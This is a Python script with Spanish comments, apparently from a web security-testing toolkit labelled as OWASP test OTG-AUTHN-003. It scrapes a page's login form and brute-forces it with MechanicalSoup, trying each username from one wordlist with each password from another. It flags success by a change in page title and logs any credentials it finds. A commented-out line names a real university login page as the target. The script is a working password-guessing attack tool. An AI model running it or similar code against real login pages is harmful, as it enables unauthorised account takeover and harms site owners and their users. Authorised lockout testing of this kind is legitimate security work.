#!/usr/bin/python3
# -*- encoding: utf-8 -*-

import mechanicalsoup
import copy
from urllib.parse import urlparse


class CampoForm(object):
    def __init__(self):
        self.campoName = ""
        self.campoType = ""
        self.campoValue = ""

    def obtenerDatosCampo(self, cadena):
        '''
        Método que permite detectar los parḿetros de los campos que
        conforma el form. Se almacena el tipo (type), nombre (name),
        y valor (value) de los campos
        '''
        cadena = cadena.split(" ")
        for i in cadena:
            if i.split("=")[0] == "type":
                self.campoType = i.split("=")[1].replace('"', '')
            elif i.split("=")[0] == "name":
                self.campoName = i.split("=")[1].replace('"', '')
            elif i.split("=")[0] == "value":
                self.campoValue = i.split("=")[1].replace('"', '')

    def adaptarCampo(self, campo):
        str1 = "<input "
        str2 = "/>"
        str1 = campo.replace(str1, "")
        return str1.replace(str2, "")


class Form(object):
    def __init__(self):
        self.nombreForm = ""
        self.metodoForm = ""
        self.accionForm = ""
        self.camposForm = list()

    def obtenerForm(self, html):
        '''
        Método que se encarga de identificar la etiqueta del form.
        '''
        tagInicial = self.substring_indexes("<form", html)
        tagFinal = self.substring_indexes("</form>", html)

        i = tagInicial[0]
        j = tagFinal[0]
        contenidoForm = ""
        while i < j:
            contenidoForm += html[i]
            i += 1
        inputs = contenidoForm.split("<input ")
        self.obtenerCabeceraForm(inputs[0])
        del inputs

    # https://github.com/MechanicalSoup/MechanicalSoup/blob/master/mechanicalsoup/form.py
    # Nombre del método original -> print_summary
    def obtenerCampos(self, form):
        '''
        Print a summary of the form.
        May help finding which fields need to be filled-in.
        '''
        listaCampos = list()
        for input in form.find_all(("input", "textarea", "select")):
            input_copy = copy.copy(input)
            # Text between the opening tag and the closing tag often
            # contains a lot of spaces that we don't want here.
            for subtag in input_copy.find_all() + [input_copy]:
                if subtag.string:
                    subtag.string = subtag.string.strip()
            # Cada campo se agrega a la lista como String (str)
            listaCampos.append(str(input_copy))

        return listaCampos

    def obtenerCamposEditbles(self):
        '''
        Obtiene los campos que pueden ser editables, es decir,
        lo campos que según el tipo (type) no sea hidden o submit.
        '''
        camposEditables = list()
        for i in self.camposForm:
            if (i.campoType != 'hidden') and (i.campoType != 'submit'):
                camposEditables.append(i)

        return camposEditables

    def obtenerCabeceraForm(self, string):
        '''
        Permite obtener los parámetros que conforma el form.
        Obtiene el campo id, la acción (action) y el método de la petición
        (method).
        '''
        string = string.split(" ")
        string.pop(0)

        for i in string:
            if i.split("=")[0] == "id":
                self.nombreForm = i.split("=")[1].replace('"', '')
            elif i.split("=")[0] == "action":
                self.accionForm = i.split("=")[1].replace('"', '')
            elif i.split("=")[0] == "method":
                self.metodoForm = i.split("=")[1].replace('"', '')

    def substring_indexes(self, substring, string):
        '''
        Generate indices of where substring begins in string
        '''
        last_found = -1
        indexes = list()
        while True:
            last_found = string.find(substring, last_found + 1)
            if last_found == -1:
                break
            indexes.append(last_found)

        return indexes


salida = list()


def fuerzaBruta(url):
    form = Form()
    browser = mechanicalsoup.StatefulBrowser()

    # Realizar petición y obtener el HTML de la url
    peticion = browser.open(url)
    tmp = browser.get_current_page()
    titulo = tmp.title.text
    html = str(tmp)

    form.obtenerForm(html)

    browser.select_form('form[action="' + form.accionForm + '"]')
    campos = form.obtenerCampos(peticion.soup.form)

    # Almacenar cada campo del form seleccionado
    for i in campos:
        campo = CampoForm()
        campo.obtenerDatosCampo(campo.adaptarCampo(i))
        form.camposForm.append(campo)

    campos = form.obtenerCamposEditbles()

    # AQUÍ SE CARGAN LOS ARCHIVOS DE FUERZA BRUTA
    exito = 0
    # Abrir el archivo de usuarios
    with open("usuarios.txt", 'r') as f:
        while True:
            if exito == 1:
                break
            usuario = f.readline()
            if usuario == "":
                break
            usuario = usuario[0:-1]

            # Abrir el archivo de contraseñas
            with open("contraseñas.txt", 'r') as f2:
                while True:
                    contraseña = f2.readline()
                    if contraseña == "":
                        break
                    contraseña = contraseña[0:-1]
                    salida.append("Probando con -> usuario: %s contraseña: %s\n" % (usuario, contraseña))
                    print("Probando con -> usuario: %s contraseña: %s" % (usuario, contraseña))
                    browser[campos[0].campoName] = usuario
                    browser[campos[1].campoName] = contraseña
                    browser.submit_selected()

                    if titulo != browser.get_current_page().title.text:
                        exito = 1
                        break
                    else:
                        browser.select_form('form[action="' + form.accionForm + '"]')
            f2.close()
    f.close()
    if exito == 1:
        salida.append("Fuerza bruta inicio de sesión exitoso\n")
        salida.append("Usuario: < %s > Contraseña: < %s > \n" % (usuario, contraseña))
        print("\nFuerza bruta inicio de sesión exitoso!")
        print("Usuario: < %s > Contraseña: < %s > \n" % (usuario, contraseña))
    else:
        salida.append("\nFalló la prueba defuerza bruta, aunque existe dicha vulnerabilidad.\n")
        print("\nFalló la prueba defuerza bruta, aunque existe dicha vulnerabilidad.\n")

    browser.close()


def escribirArchivo():
    with open("../Salida/fuerzaBruta.txt", "w") as f:
        for x in salida:
            f.write(x)
    f.close()


def main(url):
    u = urlparse(url)
    url = u.scheme + "://" + u.netloc + u.path
    print("================ Inicio prueba OTG-AUTHN-003 ==================\n")
    fuerzaBruta(url)
    escribirArchivo()
    print("================ Fin prueba OTG-AUTHN-003 ==================\n")


# main("https://simca.unicauca.edu.co/simca/index.xhtml")
